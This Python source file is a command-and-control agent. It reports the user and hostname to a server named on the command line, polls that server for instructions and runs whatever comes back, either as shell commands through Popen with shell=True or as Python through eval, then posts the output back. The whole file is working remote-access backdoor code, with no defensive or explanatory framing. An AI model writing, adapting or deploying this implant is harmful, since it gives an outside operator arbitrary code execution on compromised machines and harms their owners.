import uuid
import time 
import requests
import os
import sys
from subprocess import PIPE, Popen

if len(sys.argv) != 3:
    print("Wrong syntax!")
    print("%s <domain to connect> <port>" % sys.argv[0])
    exit()
    
my_server = "http://%s:%d/" % (sys.argv[1], int(sys.argv[2]))
my_guid = uuid.uuid4()
my_sleep = 2
my_cmd_result = None
username = os.popen("whoami").read()
hostname = os.popen("hostname").read()

while True:
    try:
        data = {"id": str(my_guid), "type": "python", "username": username, "hostname": hostname}
        if my_cmd_result is not None: 
            data["result"] = my_cmd_result
        try:
            r = requests.post(my_server, json = data)
        except:
            time.sleep(my_sleep)
            continue        
        my_cmd_result = None
        data = r.json()
        if data is None  or "__type__" not in data:
            time.sleep(my_sleep)
            continue                
        if data["__type__"] == "my_what":
            my_cmd_result = "I'm an python agent"
        elif data["__type__"] == "my_sleep":
            my_sleep = int(data["sleep"])
            print("Got command: new sleep is %d" % my_sleep)
            my_cmd_result = "New sleep is %d" % my_sleep 
        elif data["__type__"] == "my_terminal":    
            print("Got command: run in terminal '%s'" % data["command"])
            p = Popen(data["command"], shell=True, stdout=PIPE, stderr=PIPE)
            stdout, stderr = p.communicate()
            my_cmd_result = (stdout + stderr).decode("utf8")
        elif data["__type__"] == "my_eval":    
            my_cmd_result = str(eval(data["code"]))
    except Exception as e:
        if my_cmd_result is None:
            my_cmd_result = str(e)
    time.sleep(my_sleep)